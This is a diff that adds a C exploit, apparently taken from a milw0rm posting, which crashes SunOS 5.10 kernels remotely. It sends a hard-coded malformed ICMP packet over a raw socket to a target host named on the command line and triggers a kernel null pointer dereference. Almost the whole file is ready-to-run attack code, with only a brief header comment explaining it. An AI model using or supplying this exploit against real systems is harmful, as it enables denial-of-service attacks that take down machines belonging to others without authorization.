@@ -1,0 +1,82 @@
+/*
+ SunOS 5.10 Remote ICMP Kernel Crash Exploit by kcope
+ Null Pointer Dereference in Kernel Space
+ Seems to work only if attacked in the same network segment,
+ maybe because of firewalls/routers in place.
+ 
+ This seems to be the issue described in bid 22323.
+*/
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+
+unsigned char rawData[77] =
+{
+    0x45, 0xFF, 0x00, 0x4D, 0x0C, 0x52, 0x00, 0x00, 0x7E, 0x01, 0x0C, 0xF2, 0xE0, 0x5A, 0x73, 0x12,
+    0xC0, 0xA8, 0x0E, 0x58, 0x08, 0xDE, 0xAE, 0x37, 0x6F, 0x3B, 0x66, 0xA7, 0x60, 0xAA, 0x76, 0xC1,
+    0xEC, 0xA7, 0x7D, 0xFA, 0x8A, 0x72, 0x8E, 0xC6, 0xE3, 0xD2, 0x64, 0x13, 0xE7, 0x4D, 0xBC, 0x01,
+    0x40, 0x5B, 0x8E, 0x8B, 0xE5, 0xEE, 0x5E, 0x37, 0xDD, 0xC2, 0x54, 0x8E, 0x8D, 0xCE, 0x0C, 0x42,
+    0x97, 0xA1, 0x8C, 0x04, 0x8A, 0xC2, 0x6B, 0xAE, 0xE9, 0x2E, 0xFE, 0xD4, 0x4B,
+} ;
+
+long resolve(char *host)
+{
+  struct hostent *hst;
+  long addr;
+
+  hst = gethostbyname(host);
+  if (hst == NULL)
+    return(-1);
+
+  memcpy(&addr, hst->h_addr, hst->h_length);
+  memcpy(rawData+16, &addr, sizeof(long));
+
+  return(addr);
+}
+
+int main(int argc, char *argv[])
+{
+  struct sockaddr_in dst;
+  long saddr, daddr;
+  int s;
+
+  if (argc < 2)
+  {
+    printf("SunOS 5.10 Remote ICMP Kernel Crash Exploit by kcope\n");
+    printf("Usage: %s <dst>\n", *argv);
+    return(1);
+  }
+
+  daddr = resolve(argv[1]);
+  saddr = INADDR_ANY;
+
+  memcpy(rawData+16, &daddr, sizeof(long));
+//  memcpy(rawData+12, &saddr, sizeof(long));
+
+  dst.sin_addr.s_addr = daddr;
+  dst.sin_family = AF_INET;
+
+  s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+  if (s == -1)
+    return(1);
+
+  printf("Sending ICMP packet: %s\n", argv[1]);
+
+      if (sendto(s,&rawData,77,0,(struct sockaddr *)&dst,sizeof(struct sockaddr_in)) == -1)
+      {
+        perror("Error sending packet");
+        exit(-1);
+      }
+
+  return(0);
+}
+
+// milw0rm.com [2008-01-10]
